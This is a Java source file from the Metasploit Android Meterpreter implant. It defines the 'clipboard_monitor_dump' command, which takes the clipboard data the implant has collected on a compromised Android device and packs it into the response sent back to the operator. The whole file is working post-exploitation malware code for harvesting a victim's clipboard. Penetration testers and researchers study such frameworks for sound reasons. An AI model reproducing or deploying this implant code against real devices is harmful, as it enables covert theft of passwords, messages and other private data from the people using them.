
package com.metasploit.meterpreter.android;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.ClipManager;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class clipboard_monitor_dump implements Command {

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter)meterpreter;
        ClipManager clipManager = androidMeterpreter.getClipManager();
        if (clipManager == null) {
            return ERROR_FAILURE;
        }
        clipManager.dump(response);
        return ERROR_SUCCESS;
    }
}

